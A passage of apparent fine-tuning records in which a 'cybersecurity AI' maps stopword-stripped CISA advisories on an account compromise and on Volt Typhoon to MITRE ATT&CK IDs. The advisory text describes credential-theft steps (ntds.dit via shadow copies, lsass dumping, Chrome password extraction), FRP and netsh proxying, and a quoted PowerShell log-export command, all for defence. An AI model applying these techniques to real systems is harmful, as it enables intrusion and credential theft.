victim confirmed administrator credentials user2 stored locally server connection vm threat actor authenticated multiple services via user1 account well additional compromised global domain administrator account user2 threat actors use user2 account impactful due access granted onpremises ad azure ad thus enabling administrative privileges following notification dark web posting victim organization immediately disabled user1 account took two virtualized servers associated former employee offline victim also changed password user2 account removed administrator privileges neither administrative accounts multifactor authentication mfa enabled ldap queries connection vm threat actor conducted ldap queries ad likely using open source tool adfindexe based format output cisa msisac assess threat actor executed ldap queries collect user host trust relationship information also believed ldap queries generated text files threat actor posted sale dark web brokerage site aduserstxt adcomputerstxt trustdmptxt table 1 lists queries conducted 083943084056 coordinated universal time utc service authentication vm connection threat actor observed authenticating various services victim organizations network user1 user2 administrative accountsin instances threat actor authenticated common internet file service cifs various endpointsa protocol used providing shared access files printers machines network likely used file folder directory discovery assessed executed automated manner user1 authenticated four services presumably purpose network service discovery user2 authenticated twelve services note account administrative privileges onpremises network azure tenant mitre attck tactics techniques see tables 29 referencedthreat actors tactics techniques enterprise environments advisory assistance mapping malicious cyber activity mitre attck framework see cisa mitre attcks best practices mitre attck mapping cisas decider tool mitigations note mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist apply critical infrastructure organizations network defenders cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats tactics techniques procedures visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections secure monitor administrator accounts threat actor gained access network via compromised administrator accounts mfa enabled compromised user2 global domain administrator account could enabled threat actor move laterally onpremises environment azure tenant response incident victim organization removed administrator privileges user2 additionally victim organization disabled unnecessary administrator accounts enabled mfa administrator accounts prevent similar compromises cisa msisac recommend following review current administrator accounts determine necessity maintain administrator accounts essential network management reduce attack surface focus efforts security monitoring necessary accounts restrict use multiple administrator accounts one user create separate administrator accounts onpremises azure environments segment access implement principle least privilege decrease threat actors ability access key network resources enable justintime enough access administrator accounts elevate minimum necessary privileges limited time complete tasks use phishingresistant multifactor authentication mfacpg 2h eg security tokens remote access access sensitive data repositories implement phishingresistant mfa many services possibleparticularly webmail vpnsfor accounts access critical systems privileged accounts manage backups mfa also used remote loginsm1032 additional guidance secure mfa configurations visit cisas password webpage read cisas implementing phishingresistant mfa fact sheet reduce attack surface unnecessary accounts software services network create additional vectors threat actor compromise cisa msisac recommend following establish policy procedure prompt removal unnecessary accounts groups enterprise especially privileged accounts organizations implement robust continuous user management process ensure accounts offboarded employees removed longer access network maintain robust asset management policy comprehensive documentation assets tracking current version information maintain awareness outdated software mapping assets business critical functions determine need functionality assets require public internet exposurecpg 1a follow routine patching cycle operating systems applications software including thirdparty software mitigate potential exploitation restrict personal devices connecting network personal devices subject group policies security measures domain joined devices evaluate tenant settings default azure ad users register manage aspects applications create users also determine approve organizational data services application access default settings enable threat actor access sensitive information move laterally network addition users create azure ad automatically become global administrator tenant could allow threat actor escalate privileges execute malicious actions cisa msisac recommend following evaluate current user permissions azure tenant restrict potentially harmful permissions including restrict users ability register applications default users azure ad register manage applications create approve data services application access exploited threat actor access sensitive information move laterally network restrict nonadministrators creating tenants user creates azure ad automatically becomes global administrator tenant creates opportunity threat actor escalate privileges highest privileged account restrict access azure ad portal administrators users without administrative privileges change settings however view user info group info device details user privileges would allow threat actor gather valuable information malicious activities create forensically ready organization collect access securityfocused logs eg intrusion detection systemsintrusion prevention systems firewall data loss prevention virtual private network use detection incident response activitiescpg 2t enable complete coverage tools including endpoint detection response edr across environment thorough analysis anomalous activity remediation potential vulnerabilities assess security configuration azure environment cisa created secure cloud business applications scuba assessment tool help federal civilian executive branch fceb agencies verify m365 tenant configuration conforms minimal viable secure configuration baseline although scuba assessment tool developed fceb organizations benefit output cisa msisac recommend following use tools identify attack paths enable defenders identify common attack paths used threat actors shut exploited review security recommendations list provided microsoft 365 defender focus remediation critical vulnerabilities endpoints essential mission execution contain sensitive data evaluate conditional access policies conditional access policies require users want access resource complete action conditional access policies also account common signals user group memberships ip location information device application risky signin behavior identified integration azure ad identity protection review current conditional access policies determine changes necessary reset passwords establish secure password policies response incident victim organization reset passwords users employ strong password management alongside attributebased information device information time access user history geolocation data set password policy require complex passwords users minimum 16 characters enforce new requirement user passwords expirecpg 2acpg 2bcpg 2c store credentials secure manner credential manager vault privileged account management solutioncpg 2l products come default passwords ask vendors plan eliminate default passwords highlighted cisas secure design alert manufacturers protect customers eliminating default passwords mitigations vendors cisa recommends vendors incorporate secure design principles tactics practices limiting impact threat actor techniques strengthening secure posture customers prioritize secure default configurations eliminating default passwords providing highquality audit logs customers additional configuration extra charge secure default configurations prioritized eliminate need customer implementation hardening guidance immediately identify mitigate update affected products patched accordance withcisasknown exploited vulnerabilities kev catalog implement multifactor authentication mfa ideally phishingresistant mfa default rather optin feature products validate security controls addition applying mitigations cisa msisac recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory cisa recommends testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see table 29 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process cisa msisac recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory resources msisac center internet security cis cyberattack defense cis benchmarks cdm mitre attck references1 cisa analysis fiscal year 2022 risk vulnerability assessments disclaimer information report provided informational purposes cisa msisac endorse commercial entity product company service including entities products services linked within document reference specific commercial entities products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring cisa msisac version history february 15 2024 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1018, T1021, T1021.002, T1021.007, T1046, T1078.002, T1078.004, T1083, T1087.002, T1133, T1213.002, T1482, T1552.001, T1589.001"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: actions take today mitigate volt typhoon activity apply patches internetfacing systems prioritize patching critical vulnerabilities appliances known frequently exploited volt typhoon implement phishingresistant mfa ensure logging turned application access security logs store logs central system plan end life technology beyond manufacturers supported lifecycle summary cybersecurity infrastructure security agency cisa national security agency nsa federal bureau investigation fbi assess peoples republic china prc statesponsored cyber actors seeking preposition networks disruptive destructive cyberattacks us critical infrastructure event major crisis conflict united states cisa nsa fbi following partners releasing advisory warn critical infrastructure organizations assessment based observations us authoring agencies incident response activities critical infrastructure organizations compromised prc statesponsored cyber group known volt typhoon also known vanguard panda bronze silhouette dev0391 unc3236 voltzite insidious taurus us department energy doe us environmental protection agency epa us transportation security administration tsa australian signals directorates asds australian cyber security centre acsc canadian centre cyber security cccs part communications security establishment cse united kingdom national cyber security centre ncscuk new zealand national cyber security centre ncscnz us authoring agencies confirmed volt typhoon compromised environments multiple critical infrastructure organizationsprimarily communications energy transportation systems water wastewater systems sectorsin continental noncontinental united states territories including guam volt typhoons choice targets pattern behavior consistent traditional cyber espionage intelligence gathering operations us authoring agencies assess high confidence volt typhoon actors prepositioning networks enable lateral movement ot assets disrupt functions us authoring agencies concerned potential actors use network access disruptive effects event potential geopolitical tensions andor military conflicts cccs assesses direct threat canadas critical infrastructure prc statesponsored actors likely lower us infrastructure us infrastructure disrupted canada would likely affected well due crossborder integration asds acsc ncscnz assess australian new zealand critical infrastructure respectively could vulnerable similar activity prc statesponsored actors authoring agencies previously highlighted use living land lotl techniques hallmark volt typhoon actors malicious cyber activity targeting critical infrastructure group also relies valid accounts leverage strong operational security combined allows longterm undiscovered persistence fact us authoring agencies recently observed indications volt typhoon actors maintaining access footholds within victim environments least five years volt typhoon actors conduct extensive preexploitation reconnaissance learn target organization environment tailor tactics techniques procedures ttps victims environment dedicate ongoing resources maintaining persistence understanding target environment time even initial compromise authoring agencies urge critical infrastructure organizations apply mitigations advisory hunt similar malicious activity using guidance herein provided along recommendations found joint guide identifying mitigating living land techniques mitigations primarily intended ot administrators critical infrastructure organizations following mitigations prevention response incident help disrupt volt typhoons accesses reduce threat critical infrastructure entities activity identified authoring agencies strongly recommend critical infrastructure organizations apply incident response recommendations advisory report incident relevant agency see contact information section additional information see joint advisory peoples republic china statesponsored cyber actor living land evade detection us department justice doj press release us government disrupts botnet peoples republic china used conceal hacking critical infrastructure information prc statesponsored malicious cyber activity see cisas china cyber threat overview advisories webpage download pdf version report aa24038a prc statesponsored actors compromise maintain persistent access us critical infrastructure pdf 156 mb read accompanying malware analysis reportmar104483621v1 volt typhoon downloadable copy indicators compromise iocs see mar10448362c1v2clearstix2json json 5199 kb technical details note advisory uses mitre attck enterprise framework version 14 see appendix c mitre attck tactics techniques section tables volt typhoon cyber threat actors activity mapped mitre attck tactics techniques assistance mapping malicious cyber activity mitre attck framework see cisa mitre attcks best practices mitre attck mapping cisas decider tool overview activity may 2023 authoring agenciesworking industry partnersdisclosed information activity attributed volt typhoon see joint advisory peoples republic china statesponsored cyber actor living land evade detection since cisa nsa fbi determined activity part broader campaign volt typhoon actors successfully infiltrated networks critical infrastructure organizations continental noncontinental united states territories including guam us authoring agencies primarily observed compromises linked volt typhoon communications energy transportation systems water wastewater systems sector organizations networks victims smaller organizations limited cybersecurity capabilities provide critical services larger organizations key geographic locations volt typhoon actors tailor ttps victim environment however us authoring agencies observed actors typically following pattern behavior across identified intrusions choice targets pattern behavior consistent traditional cyber espionage intelligence gathering operations us authoring agencies assess high confidence volt typhoon actors prepositioning networks enable disruption ot functions across multiple critical infrastructure sectors see figure 1 volt typhoon conducts extensive precompromise reconnaissance learn target organizations network architecture operational protocols reconnaissance includes identifying network topologies security measures typical user behaviors key network staff intelligence gathered volt typhoon actors likely leveraged enhance operational security example instances volt typhoon actors may abstained using compromised credentials outside normal working hours avoid triggering security alerts abnormal account activities volt typhoon typically gains initial access network exploiting known zeroday vulnerabilities publicfacing network appliances eg routers virtual private networksvpns firewalls connects victims network via vpn followon activities volt typhoon aims obtain administrator credentials within network often exploiting privilege escalation vulnerabilities operating system network services cases volt typhoon obtained credentials insecurely stored publicfacing network appliance volt typhoon uses valid administrator credentials move laterally domain controller dc devices via remote access services remote desktop protocol rdp volt typhoon conducts discovery victims network leveraging lotl binaries stealth key tactic includes using powershell perform targeted queries windows event logs focusing specific users periods queries facilitate discreet extraction security event logs dat files allowing volt typhoon actors gather critical information minimizing detection strategy blending indepth precompromise reconnaissance meticulous postexploitation intelligence collection underscores sophisticated strategic approach cyber operations volt typhoon achieves full domain compromise extracting active directory database ntdsdit dc volt typhoon frequently employs volume shadow copy service vss using commandline utilities vssadmin access ntdsdit ntdsdit file centralized repository contains critical active directory data including user accounts passwords hashed form sensitive data leveraged exploitation method entails creation shadow copya pointintime snapshotof volume hosting ntdsdit file leveraging snapshot volt typhoon actors effectively bypass file locking mechanisms inherent live windows environment typically prevent direct access ntdsdit file domain controller operational volt typhoon likely uses offline password cracking techniques decipher hashes process involves extracting hashes ntdsdit file applying various password cracking methods brute force attacks dictionary attacks sophisticated techniques like rainbow tables uncover plaintext passwords successful decryption passwords allows volt typhoon actors obtain elevated access infiltrate manipulate network volt typhoon uses elevated credentials strategic network infiltration additional discovery often focusing gaining capabilities access ot assets volt typhoon actors observed testing access domainjoint ot assets using default ot vendor credentials certain instances possessed capability access ot systems whose credentials compromised via ntdsdit theft access enables potential disruptions manipulating heating ventilation air conditioning hvac systems server rooms disrupting critical energy water controls leading significant infrastructure failures cases volt typhoon actors capability access camera surveillance systems critical infrastructure facilities one confirmed compromise volt typhoon actors moved laterally control system positioned move second control system figure 1 typical volt typhoon activity successfully gaining access legitimate accounts volt typhoon actors exhibit minimal activity within compromised environment except discovery noted suggesting objective maintain persistence rather immediate exploitation assessment supported observed patterns volt typhoon methodically retargets organizations extended periods often spanning several years continuously validate potentially enhance unauthorized accesses evidence meticulous approach seen instances repeatedly exfiltrate domain credentials ensuring access current valid accounts example one compromise volt typhoon likely extracted ntdsdit three domain controllers fouryear period another compromise volt typhoon actors extracted ntdsdit two times victim ninemonth period industry reportingidentifying volt typhoon actors silent network following credential dumping perform discovery learn environment exfiltrate datais consistent us authoring agencies observations indicates aim achieve maintain persistence network one confirmed compromise industry partner observed volt typhoon actors dumping credentials regular intervals addition leveraging stolen account credentials actors use lotl techniques avoid leaving malware artifacts systems would cause alerts strong focus stealth operational security allows maintain longterm undiscovered persistence volt typhoons operational security enhanced targeted log deletion conceal actions within compromised environment see sections volt typhoon ttps observed us authoring agencies multiple confirmed volt typhoon compromises observed ttps reconnaissance volt typhoon actors conduct extensive precompromise reconnaissance learn target organization network staff includes web searchesincluding victimowned sitesfor victim host identity network information especially information key network administrators according industry reporting volt typhoon actors use fofa1 shodan censys querying searching exposed infrastructure instances us authoring agencies observed volt typhoon actors targeting personal emails key network staff post compromise resource development historically volt typhoon actors use multihop proxies command control c2 infrastructure proxy typically composed virtual private servers vpss small officehome office soho routers recently volt typhoon actors used cisco netgear endoflife soho routers implanted kv botnet malware support operations see doj press release us government disrupts botnet peoples republic china used conceal hacking critical infrastructure information initial access obtain initial access volt typhoon actors commonly exploit vulnerabilities networking appliances fortinet ivanti connect secure formerly pulse secure netgear citrix cisco often use publicly available exploit code known vulnerabilities also adept discovering exploiting zeroday vulnerabilities one confirmed compromise volt typhoon actors likely obtained initial access exploiting cve202242475 network perimeter fortigate 300d firewall patched evidence buffer overflow attack identified within secure sockets layer sslvpn crash logs initial access achieved volt typhoon actors typically shift establishing persistent access often use vpn sessions securely connect victim environments enabling discreet followon intrusion activities tactic provides stable foothold network also allows blend regular traffic significantly reducing chances detection execution volt typhoon actors rarely use malware postcompromise execution instead volt typhoon actors gain access target environments use handsonkeyboard activity via commandline native tools processes systems often referred lolbins known lotl maintain expand access victim networks according industry reporting commands appear exploratory experimental operatorsie malicious actors adjust repeat multiple times2 details lotl activity see credential access discovery sections appendix volt typhoon lotl activity similar lotl volt typhoon actors also use legitimate outdated versions network admin tools example one confirmed compromise actors downloaded outdated version comsvcsdll dc nonstandard folder comsvcsdll legitimate microsoft dynamic link library dll file normally found system32 folder actors used dll minidump process id local security authority subsystem service lsass dump lsass process memory obtain credentials lsass process memory space contains hashes current users operating system os credentials actors also use legitimate nonnative network admin forensic tools example volt typhoon actors observed using magnet ram capture mrc version 120 domain controllers mrc free imaging tool captures physical memory computer volt typhoon actors likely used analyze inmemory data sensitive information credentials intransit data typically accessible disk volt typhoon actors also observed implanting fast reverse proxy frp command control3 see command control section persistence volt typhoon primarily relies valid credentials persistence defense evasion volt typhoon strong operational security actors primarily use lotl defense evasion allows camouflage malicious activity typical system network behavior potentially circumventing simplistic endpoint security capabilities information see joint guide identifying mitigating living land techniques volt typhoon actors also obfuscate malware one confirmed compromise volt typhoon obfuscated frp client files brightmetricagentexe smsvcserviceexe commandline port scanning utility scanline packing files ultimate packer executables upx frp client applications support encryption compression easy token authentication work across multiple protocolsincluding transmission control protocol tcp user datagram protocol udp hypertext transfer protocol http hypertext transfer protocol secure https frp client applications use kuai connection protocol kcp errorchecked anonymous data stream delivery udp packetlevel encryption support see appendix c cisa malware analysis report mar104483621v1 information addition lotl obfuscation techniques volt typhoon actors observed selectively clearing windows event logs system logs technical artifacts remove evidence intrusion activity masquerading file names credential access volt typhoon actors first obtain credentials publicfacing appliances gaining initial access exploiting privilege escalation vulnerabilities operating system network services cases obtained credentials insecurely stored appliance one instance volt typhoon likely exploited cve202242475 unpatched fortinet device volt typhoon actors compromised domain admin account stored inappropriately device volt typhoon also consistently obtains valid credentials extracting active directory database file ntdsditin cases multiple times victim long periods ntdsdit contains usernames hashed passwords group memberships domain accounts essentially allowing full domain compromise hashes cracked offline obtain ntdsdit us authoring agencies observed volt typhoon move laterally domain controller via interactive rdp session using compromised account domain administrator privileges execute windowsnative vssadmin command create volume shadow copy use windows management instrumentation console wmic commands execute ntdsutil lotl utility copy ntdsdit system registry hive volume shadow copy exfiltrate ntdsdit system registry hive crack passwords offline details including specific commands used see appendix volt typhoon lotl activitynote volume shadow copy contains copy files folders exist specified volume volume shadow copy created dc includes ntdsdit system registry hive provides keys decrypt ntdsdit file volt typhoon actors also observed interacting putty application enumerating existing stored sessions given interaction exposure cleartextstored proxy passwords used remote administration volt typhoon actors potentially access putty profiles allow access critical systems see lateral movement section according industry reporting volt typhoon actors attempted dump credentials lsass see appendix b commands used2 us authoring agencies observed volt typhoon actors leveraging mimikatz harvest credentials industry partners observed volt typhoon leveraging impacket2 mimikatz credential dumping tool volt typhoon actors use obtain credentials one confirmed compromise volt typhoon used rdp connect server run mimikatz leveraging compromised administrator account deploy impacket open source python toolkit programmatically constructing manipulating network protocols contains tools kerberos manipulation windows credential dumping packet sniffing relay attacksas well remote service execution discovery volt typhoon actors observed using commercial tools lotl utilities appliances already present system system information network service group user discovery volt typhoon uses least following lotl tools commands system information network service group user discovery techniques observed specific examples discovery include capturing successful logon events specifically one incident analysis powershell console history domain controller indicated security event logs directed file named userdat evidenced executed command geteventlog security instanceid 4624 afteryearmonthdate fl outfile cuserspublicdocumentsuserdat indicates groups specific interest capturing successful logon events event id 4624 analyze user authentication patterns within network additionally file system analysis specifically master file table mft uncovered evidence separate file systeminfodat created cuserspublicdocuments subsequently deleted presence activities suggests methodical approach volt typhoon actors collecting possibly removing traces sensitive log information compromised system executing tasklist v gather detailed process listing followed executing taskkill f im rdpserviceexe function executable known executing net user quser user account information creating accessing file named rult3uillog domain controller cwindowssystem32 rult3uillog file contained user activities compromised system showcasing combination window title information focus shifts keypresses command executions across google chrome windows powershell corresponding timestamps employing ping various ip addresses check network connectivity net start list running services see appendix additional lotl examples one confirmed compromise volt typhoon actors attempted use advanced ip scanner network admin use scan network volt typhoon actors observed strategically targeting network administrator web browser datafocusing browsing history stored credentialsto facilitate targeting personal email addresses see reconnaissance section discovery possible network modifications may impact threat actors persistence within victim networks one confirmed compromise volt typhoon actors obtained history file user data directory network administrator users chrome browser obtain history file volt typhoon actors first executed rdp session users workstation initially attempted failed obtain c file name usersredactedappdatalocalgooglechromeuserdatadefaulthistory file evidenced accompanying 1016 reopen failed smb error listed application event log threat actors disconnected rdp session workstation accessed file cusersredacteddownloadshistoryzip file presumably contained data user data directory users chrome browser actors likely saved downloads directory exfiltration shortly accessing historyzip file actors terminated rdp sessions four months later volt typhoon actors accessed users chrome data c file name usersredactedappdatalocalgooglechromeuser datalocal state file name usersredactedappdatalocalgooglechromeuser datadefaultlogin data via smb local state file contains advanced encryption standard aes encryption key used encrypt passwords stored chrome browser would enable actors obtain plaintext passwords stored login data file chrome browser another confirmed compromise volt typhoon actors accessed directories containing chrome edge user data multiple systems directory interaction observed network paths cusersredactedappdatalocalgooglechromeuser data cusersredactedappdatalocalmicrosoftedgeuser data also enumerated several directories including directories containing vulnerability testing cyber related content facilities data construction drawings lateral movement lateral movement volt typhoon actors observed predominantly employing rdp compromised valid administrator credentials note full onpremises microsoft active directory identity compromise see credential access section group may capable using methods pass hash pass ticket lateral movement one confirmed compromise water wastewater systems sector entity obtaining initial access volt typhoon actors connected network via vpn administrator credentials obtained opened rdp session credentials move laterally ninemonth period moved laterally file server domain controller oracle management server oms vmware vcenter server actors obtained domain credentials domain controller performed discovery collection exfiltration file server see discovery collection exfiltration sections volt typhoons movement vcenter server likely strategic prepositioning ot assets vcenter server adjacent ot assets volt typhoon actors observed interacting putty application server enumerating existing stored sessions information volt typhoon potentially access range critical putty profiles including water treatment plants water wells electrical substation ot systems network security devices would enable access critical systems see figure 2 figure 2 volt typhoon lateral movement path file server dc otadjacent assets additionally volt typhoon actors observed using psexec execute remote processes including automated acceptance enduser license agreement eula administrative account signified accepteula command flag volt typhoon actors may attempted move laterally cloud environment one victims network direct attribution volt typhoon group inconclusive period known network presence anomalous login attempts azure tenant potentially using credentials previously compromised theft ntdsdit attempts coupled misconfigured virtual machines open rdp ports suggested potential cloudbased lateral movement however subsequent investigations including password changes multifactor authentication mfa implementations revealed authentication failures nonassociated ip addresses definitive link volt typhoon collection exfiltration us authoring agencies assess volt typhoon primarily collects information would facilitate followon actions physical impacts example one confirmed compromise collected sensitive information obtained file server multiple zipped files likely exfiltrated files via server message block smb see figure 3 collected information included diagrams documentation related ot equipment including supervisory control data acquisition scada systems relays switchgear data crucial understanding potentially impacting critical infrastructure systems indicating focus gathering intelligence could leveraged actions targeting physical assets systems figure 3 volt typhoon attack path exfiltration data file server another compromise volt typhoon actors leveraged wmic create use temporary directories cuserspublicpro cwindowstemptmp cwindowstemptmpactive directory cwindowstemptmpregistry stage extracted ntdsdit system registry hives ntdsutil execution volume shadow copies see credential access section obtained two dcs compressed archived extracted ntdsdit accompanying registry files executing ronfexe likely renamed version archive utility rarexe command control volt typhoon actors observed leveraging compromised soho routers virtual private servers vps proxy c2 traffic information see doj press release us government disrupts botnet peoples republic china used conceal hacking critical infrastructure also observed setting frp clients victims corporate infrastructure establish covert communications channels command control one instance volt typhoon actors implanted frp client filename smsvcserviceexe shortel enterprise contact center ecc server second frp client filename brightmetricagentexe another server clients executed via powershell open reverse proxies compromised system volt typhoon c2 servers brightmetricagentexe additional capabilities frp client locate servers behind network firewall obscured network address translation nat also contains multiplexer libraries bidirectionally stream data nat networks contains commandline interface cli library leverage command shells powershell windows management instrumentation wmi z shell zsh see appendix c mar104483621v1 information compromise volt typhoon actors exploited paessler router traffic grapher prtg server intermediary frp operations facilitate used netsh command legitimate windows command create portproxy registry modification prtg server key alteration redirected specific port traffic volt typhoons proxy infrastructure effectively converting prtgs server proxy c2 traffic see appendix b details detectionhunt recommendations apply living land detection best practices apply prioritized detection hardening best practice recommendations provided joint guide identifying mitigating living land techniques many organizations lack security network management best practices established baselines support detection malicious lotl activitythis makes difficult network defenders discern legitimate behavior malicious behavior conduct behavior analytics anomaly detection proactive hunting conventional iocs associated malicious activity generally lacking complicating network defenders efforts identify track categorize sort malicious behavior advisory provides guidance multifaceted cybersecurity strategy enables behavior analytics anomaly detection proactive hunting part comprehensive approach mitigating cyber threats employ lotl techniques review application security system event logs routinely review application security system event logs focusing windows extensible storage engine technology esent application logs due volt typhoons ability longterm undetected persistence network defenders assume significant dwell time review specific application event log ids remain endpoints longer periods compared security event logs ephemeral artifacts focus windows esent logs certain esent application log event ids 216 325 326 327 may indicate actors copying ntdsdit see table 1 examples esent key log indicators investigated please note incidents may always exact matches listed event detail column due variations event logging ttps monitor review ot system logs review access logs communication paths ot networks looking anomalous accesses protocols measure baseline normal operations network traffic industrial control system ics assess traffic anomalies malicious activity configure intrusion detection systems ids create alarms ics network traffic outside normal operations track monitor audit trails critical areas ics set security incident event monitoring siem monitor analyze correlate event logs across ics network identify intrusion attempts review cisas recommended cybersecurity practices industrial control systems joint advisory nsa cisa recommend immediate actions reduce exposure across operational technologies control systems ot system detection mitigation guidance use gait detect possible network proxy activities use gait4 detect network proxy activities developed sandia national labs gait publicly available zeek5 extension gait extension help enrich zeeks network connection monitoring ssl logs including additional metadata logs specifically gait captures unique tcp options timing data tcp transport layer security tls secure shell ssh layer inferred round trip times rtt aiding identification software used endpoints intermediaries gait extension zeek effective tool enriching network monitoring logs detailed metadata specifically designed detect volt typhoon actor activities extensions capabilities extend general anomaly detection network traffic includingbut limited toproxying activities therefore gait helpful identifying tactics similar used volt typhoon proxy networks frp clients c2 communication proxying activities detected using additional metadata necessarily indicative volt typhoon presence serves valuable augmentation current security stacks broader spectrum threat detection information see sandia national labs gait github page sandialabsgait zeek extension collect metadata profiling endpoints proxies review logins impossible travel examine vpn account logon times frequency duration locations logons two geographically distant locations within short timeframe single user may indicate account used maliciously logons unusual frequency duration may indicate threat actor attempting access system repeatedly maintain prolonged sessions purpose data extraction review standard directories unusual files review directories cwindowstemp cuserspublic unexpected unusual files monitor temporary file storage directories files typically located standard system paths system32 directory example volt typhoon observed downloading comsvcsdll nonstandard folder file normally found system32 folder incident response compromise potential compromise detected organizations assume full domain compromise volt typhoons known behavioral pattern extracting ntdsdit dcs organizations immediately implement following immediate defensive countermeasures sever enterprise network internet note step requires agency understand internal external connections making decision sever internet access knowledge connections must combined care avoid disrupting critical functions sever internet shutdown nonessential traffic affected enterprise network internet reset credentials privileged nonprivileged accounts within trust boundary compromised account reset passwords domain users local accounts guest helpassistant defaultaccount system administrator krbtgt krbtgt account responsible handling kerberos ticket requests well encrypting signing krbtgt account reset twice account twopassword history first account reset krbtgt needs allowed replicate prior second reset avoid issues see cisas eviction guidance networks affected solarwinds active directorym365 compromise information although tailored fceb agencies compromised 2020 solarwinds orion supply chain compromise steps applicable organizations windows ad compromise review access policies temporarily revoke privilegesaccess affected accountsdevices necessary alert attacker eg intelligence purposes privileges reduced affected accountsdevices contain reset relevant account credentials access keys investigation finds threat actors access limited nonelevated permissions monitor related accounts especially administrative accounts signs unauthorized access audit network appliance edge device configurations indicators malicious activity signs unauthorized malicious configuration changes organizations ensure audit current network device running configuration local configurations could loaded boot time configuration changes identified change credentials used manage network devices include keys strings used secure network device functions snmp stringsuser credentials ipsecike preshared keys routing secrets tacacsradius secrets rsa keyscertificates etc update firmware software latest version report compromise authoring agency see contact information section organizations cloud hybrid environments apply best practices identity credential access management verify accounts privileged role assignments cloud native synced active directory audit conditional access policies ensure global administrators highly privileged service principals accounts exempted audit privileged role assignments ensure adherence principle least privilege assigning privileged roles leverage justintime justenough access mechanisms administrators need elevate privileged role hybrid environments ensure federated systems ad fs configured monitored properly audit enterprise applications recently added applications examine api permissions assigned reconnect internet note decision reconnect internet depends senior leaderships confidence actions taken possibledepending environmentthat new information discovered preeviction eviction steps could add additional eviction tasks minimize control use remote access tools protocols applying best practices joint guide securing remote access software joint cybersecurity information sheet keeping powershell security measures use embrace consider sharing technical information authoring agency andor sectorspecific information sharing analysis center information incident response remediation see joint advisory technical approaches uncovering remediating malicious activity advisory provides incident response best practices cisas federal government cybersecurity incident vulnerability response playbooks although tailored us federal civilian executive branch fceb agencies playbooks applicable organizations incident response playbook provides procedures identify coordinate remediate recover track successful mitigations incidents joint water wastewater sector incident response guide joint guide provides incident response best practices information federal resources water wastewater systems sector organizations mitigations mitigations intended administrators critical infrastructure organizations authoring agencies recommend software manufactures incorporate secure design default principles tactics software development practices strengthen security posture customers information secure design practices may protect customers common volt typhoon techniques see joint guide identifying mitigating living land techniques joint secure design alert security design improvements soho device manufacturers information secure design see cisas secure design webpage joint guide authoring agencies recommend organizations implement mitigations improve organizations cybersecurity posture basis volt typhoon activity mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats tactics techniques procedures visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections network administrators defenders harden attack surface apply patches internetfacing systems within riskinformed span timecpg 1e prioritize patching critical assets known exploited vulnerabilities vulnerabilities appliances known frequently exploited volt typhoon eg fortinet ivanti netgear citrix cisco devices apply vendorprovided industry standard hardening guidance strengthen software system configurations note part cisas secure design campaign cisa urges software manufacturers prioritize secure default configurations eliminate need customer implementation hardening guidelines maintain regularly update inventory organizational assetscpg 1a use third party assessments validate current system network security compliance via security architecture reviews penetration tests bug bounties attack surface management services incident simulations tabletop exercises announced unannouncedcpg 1f limit internet exposure systems necessary organizations primary attack surface combination exposure internetfacing systems decrease attack surface exposing systems management interfaces internet necessary plan end life technology beyond manufacturer supported lifecycle inventories organizational assets leveraged patch configuration management noted inventories also enable identification technology beyond manufacturers supported lifecycle technology beyond end life end support additional cybersecurity vigilance necessary may warrant one following supplemental support agreements additional scanning testing configuration changes isolation segmentation development forwardlooking plans facilitate replacement secure credentials store credentials edge appliancesdevices ensure edge devices contain accounts could provide domain admin access store plaintext credentials systemcpg 2l credentials stored securelysuch credentialpassword manager vault privileged account management solutionsso accessed authenticated authorized users change default passwordscpg 2a ensure meet policy requirements complexity implement enforce organizational systemenforced policy requires passwords passwordprotected assets least 15 characters allow users reuse passwords accounts applications services etccpg 2c allow service accountsmachine accounts reuse passwords member user accounts configure group policy settings prevent web browsers saving passwords disable autofill functions disable storage clear text passwords lsass memory secure accounts implement phishingresistant mfa access assetscpg 2h separate user privileged accounts user accounts never administrator superuser privilegescpg 2e administrators never use administrator accounts actions activities associated administrator role eg checking email web browsing enforce principle least privilege ensure administrator accounts minimum permissions necessary complete tasks review account permissions defaultaccounts edge appliancesdevices remove domain administrator privileges identified significantly limit number users elevated privileges implement continuous monitoring changes group membership especially privileged groups detect respond unauthorized modifications remove accounts highprivilege groups like enterprise admins schema admins temporarily reinstate privileges necessary strict auditing reduce risk privilege abuse transition group managed service accounts gmsas suitable enhanced management security service account credentials gmsas provide automated password management simplified service principal name spn management enhancing security traditional service accounts see microsofts group managed service accounts overview enforce strict policies via group policy user rights assignments limit highprivilege service accounts consider using privileged access management pam solution manage access privileged accounts resourcescpg 2l pam solutions also log alert usage detect unusual activity complement pam solution rolebased access control rbac tailored access based job requirements ensures elevated access granted required limited duration minimizing window opportunity abuse exploitation privileged credentials implement active directory tiering model segregate administrative accounts based access level associated risk approach reduces potential impact compromised account see microsofts pam environment tier model harden administrative workstations permit administrative activities workstations appropriately hardened based administrative tier see microsofts privileged access devices important privileged access disable user accounts access organizational resources employees day departurecpg 2g regularly audit user admin service accounts remove disable unused unneeded accounts applicable regularly roll ntlm hashes accounts support tokenbased authentication improve management hybrid cloud onpremises identity federation using cloud administrators asynchronous onpremises environments ensuring onpremises administrators asynchronous cloud using cisas scubagear tool discover cloud misconfigurations microsoft cloud tenants scuba gear automation script comparing federal civilian executive branch fceb agency tenant configurations cisa m365 baseline recommendations scubagear part cisas secure cloud business applications scuba project provides guidance fceb agencies securing cloud business application environments protecting federal information created accessed shared stored environments although tailored fceb agencies project provides security guidance applicable organizations cloud environments information scubagear see cisas secure cloud business applications scuba project using endpoint detection response capabilities actively defend onpremises federation servers secure remote access services limit use rdp remote desktop services rdp 